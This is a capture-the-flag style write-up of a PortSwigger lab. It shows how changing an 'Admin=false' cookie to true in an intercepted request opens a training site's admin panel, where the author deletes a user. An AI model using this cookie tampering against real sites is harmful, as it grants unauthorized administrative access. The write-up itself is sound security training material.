---
title: User Role Controlled by Request Parameter
author: Gamezilla
date: 2025-05-30 14:00:00 +0100
categories: [PortSwigger]
comments: false
toc: false
pin: false
tags: [portswigger, burp, burpsuite, SSV, courses, URCRP]
math: false
mermaid: false
---

## 1. Statement

This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.

Solve the lab by accessing the admin panel and using it to delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

![enonce](/assets/img/posts/PortSwigger/ServerSideVulnerabilities/UserRoleControlledbyRequestParameter/enonce.png)


---

## 2. Challenge

### a. User role controlled by request parameter, what is it ?

Parameter-based access control methods
Some applications determine the user's access rights or role at login, and then store this information in a user-controllable location. This could be:

A hidden field.
A cookie.
A preset query string parameter.
The application makes access control decisions based on the submitted value. For example:

```
https://insecure-website.com/login/home.jsp?admin=true
https://insecure-website.com/login/home.jsp?role=1
```
This approach is insecure because a user can modify the value and access functionality they're not authorized to, such as administrative functions.

### b. Vulnerability Analysis

As the course explains it to us, as we arrive on the website, we want to try to search for the cookies of the website, for that, we can use the Burp Tool, or the console directly :


![console](/assets/img/posts/PortSwigger/ServerSideVulnerabilities/UserRoleControlledbyRequestParameter/console.png)

In the Console, we browse directly to "Application" -> "Cookies" -> "Admin" -> "true"

or if we use the Burp suite, we intercept the request after logging in as wiener:peter when we type : 
https://lab-website.com/admin

We intercept this result :
```
GET /admin HTTP/2
Host: 0aa200360456838f81cebbb700eb007e.web-security-academy.net
Cookie: Admin=false; session=OaD9VKOapvrO5mK28oIfWxGwSGPB7O88
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```
We now have to set : Cookie: Admin = false;
to : Cookie: Admin = true;

As we find the administrator panel, we can, now, delete the "Carlos" user just by pressing the Delete button next to his name and that ends the challenge, and hereby the writeup

![ending](/assets/img/posts/PortSwigger/ServerSideVulnerabilities/UserRoleControlledbyRequestParameter/ending.png)


---

## END of the writeup.

